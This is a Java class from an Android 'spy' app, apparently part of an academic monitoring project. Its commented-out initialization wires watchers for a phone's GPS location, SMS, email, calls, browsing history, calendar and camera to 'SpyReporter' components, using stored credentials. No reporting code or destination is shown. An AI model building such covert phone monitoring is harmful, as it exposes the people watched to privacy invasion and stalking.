package th.ac.bu.mcop.android.spy;

import th.ac.bu.mcop.android.monitor.AndroidMonitorApplication;
import th.ac.bu.mcop.android.monitor.observer.AndroidBrowsingHistoryWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCalendarWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCallWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCameraWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidEmailWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidGpsWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidSmsWatcher;
import th.ac.bu.mcop.android.spy.reporter.BrowsingHistorySpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CalendarSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CallSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.GpsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MailSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MediaSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SmsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SpyReporter;
import th.ac.bu.mcop.mobile.monitor.core.Watchdog;

import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;

public class SpyApp/* extends AndroidMonitorApplication */{
	public static final String APPLICATION_TAG = "spiderman";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

//	@Override
//	protected void initialize(Watchdog watchdog, IntentFilter filter) {
//		// Yeah, I also want to read my configuration from local preferences
//		SharedPreferences settings = getSharedPreferences(
//				APPLICATION_TAG, Context.MODE_PRIVATE);
//		String username = settings.getString(USERNAME_FIELD, "");
//		String password = settings.getString(PASSWORD_FIELD, "");
//		SpyReporter.getSpyLogger().setAuthCredentials(username, password);
//		// Monitor all interesting events
//		register(new AndroidGpsWatcher(new GpsSpyReporter(), 480000), filter);
//		register(new AndroidSmsWatcher(new SmsSpyReporter()), filter);
//		register(new AndroidEmailWatcher(new MailSpyReporter()), filter);
//		register(new AndroidCallWatcher(new CallSpyReporter()), filter);
//		register(new AndroidBrowsingHistoryWatcher(new BrowsingHistorySpyReporter()), filter);
//		register(new AndroidCalendarWatcher(new CalendarSpyReporter()), filter);
//		register(new AndroidCameraWatcher(new MediaSpyReporter(username)), filter);
//		// Configuration dialog
//		register(new ConfiguratingWatcher(), filter);
//	}
}